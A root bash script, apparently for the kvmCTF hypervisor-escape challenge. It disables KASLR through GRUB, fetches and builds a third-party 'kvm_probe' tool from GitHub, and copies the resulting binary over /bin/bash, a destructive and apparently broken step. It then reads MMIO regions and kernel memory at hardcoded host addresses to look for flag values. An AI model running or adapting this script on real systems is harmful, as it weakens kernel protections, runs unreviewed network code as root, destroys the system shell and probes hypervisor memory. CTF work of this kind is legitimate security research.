#!/bin/bash

echo "[*] disabling kaslr..."
if grep -qw "nokaslr" /proc/cmdline; then
    echo "[+] KASLR is DISABLED (nokaslr in cmdline)"
else
    echo "[!] KASLR is ENABLED - attempting to disable for next boot..."
    # Add nokaslr to GRUB if not already present
    if ! grep -qw "nokaslr" /etc/default/grub; then
         sed -i 's/^GRUB_CMDLINE_LINUX=\"/GRUB_CMDLINE_LINUX=\"nokaslr /' /etc/default/grub
         update-grub
        echo "[+] 'nokaslr' added to GRUB. You must reboot for KASLR to be disabled."
        echo "[+] Reboot now? (y/N)"
        read answer
        if [[ "$answer" =~ ^[Yy]$ ]]; then
             reboot
        else
            echo "[!] KASLR will remain enabled until you reboot."
        fi
    else
        echo "[*] 'nokaslr' already in /etc/default/grub. Just reboot to disable KASLR."
    fi
fi

echo -e "\n\033[1;36m[*] Ensuring environment is ready...\033[0m"
KERN_VER=$(uname -r)

### ===Install basic build tools===
apt update -y >/dev/null
apt install sudo git make xxd gcc python3-venv python3-pip gdb build-essential binutils tar -y >/dev/null || true
apt install -f -y >/dev/null

sleep 2
 if [ ! -f "/root/vmlinux" ]; then
     echo "[*] Downloading latest kvmctf bundle for vmlinux..."
     wget -q https://storage.googleapis.com/kvmctf/latest.tar.gz
     tar -xzf latest.tar.gz
     mv /root/kvmctf-6.1.74/vmlinux/vmlinux /root
     echo "[+] vmlinux moved to /root"
 else
     echo "[+] /root/vmlinux already exists, skipping download."
 fi

sleep 2
echo "[*] downloading necessary headers..."
wget -q https://debian.sipwise.com/debian-security/pool/main/l/linux/linux-headers-6.1.0-21-common_6.1.90-1_all.deb
wget -q https://debian.sipwise.com/debian-security/pool/main/l/linux/linux-headers-6.1.0-21-amd64_6.1.90-1_amd64.deb

### ===Install with verification===
sleep 2
 apt install linux-compiler-gcc-12-x86 linux-kbuild-6.1 -y
 sleep 2
echo "[*] Installing necessary headers..."
dpkg -i *.deb || true

sleep 2
echo "[*] installing header packages..."
apt-get install linux-headers-6.1.0-21-amd64 linux-headers-6.1.0-21-common -y 
apt-get install linux-headers-6.1.0-21-image -y
apt-get build-dep linux-headers-6.1.0-21-amd64 linux-headers-6.1.0-21-common -y
apt-get build-dep linux-headers-6.1.0-21-image -y

sleep 2
echo "[*] installing any missing packages..."
apt install -f -y >/dev/null
apt-get --fix-broken install

sleep 2
echo "[*] getting kvm_prober setup..."
git clone --recursive https://github.com/nickharrison2002000/kvm_probe
cd kvm_probe
make
make install
cp kvm_prober /bin/bash

sleep 2
echo "[*] allocating memory for kvm_prober..."
kvm_prober allocvqpage

sleep 2
echo "[*] host VA and PA addresses"
echo "Write flag address: 0xffffffff826279a8    0x64279a8"
echo "Read flag address:  0xffffffff82b5ee10    0x695ee10"

sleep 2
echo "[*] Write flags default value"
echo "0xdeadbeef41424344"

echo "[*] Checking potential addresses for flags"

# Scanning MMIO regions
echo "[+] Scanning MMIO region 0x02A27968"
kvm_prober readmmio_buf 0x02A27968 1080
sleep 2

echo "[+] Scanning MMIO region 0x0275ef50"
kvm_prober readmmio_buf 0x0275ef50 1080
sleep 2

echo "[+] Scanning MMIO region 0x02b5ee10"
kvm_prober readmmio_buf 0x02b5ee10 1080
sleep 2

echo "[+] Scanning MMIO region 0x026279a8"
kvm_prober readmmio_buf 0x026279a8 1080
sleep 2

echo "[+] Scanning MMIO region 0x64279a8"
kvm_prober readmmio_buf 0x64279a8 1080
sleep 2

echo "[+] Scanning MMIO region 0x695ee10"
kvm_prober readmmio_buf 0x695ee10 1080
sleep 2

# Scanning kernel memory
echo "[+] Scanning kernel memory 0xffffffff826279a8"
kvm_prober readkvmem 0xffffffff826279a8 1080
sleep 2

echo "[+] Scanning kernel memory 0xffffffff82b5ee10"
kvm_prober readkvmem 0xffffffff82b5ee10 1080
sleep 2

echo "[+] Scanning kernel memory 0xffffffff82A27968"
kvm_prober readkvmem 0xffffffff82A27968 1080
sleep 2

echo "[+] Scanning kernel memory 0xffffffff8275ef50"
kvm_prober readkvmem 0xffffffff8275ef50 1080

echo "check for anything with deadbeef in it possibly reversed or things like dcba"

sleep 5

sleep 2
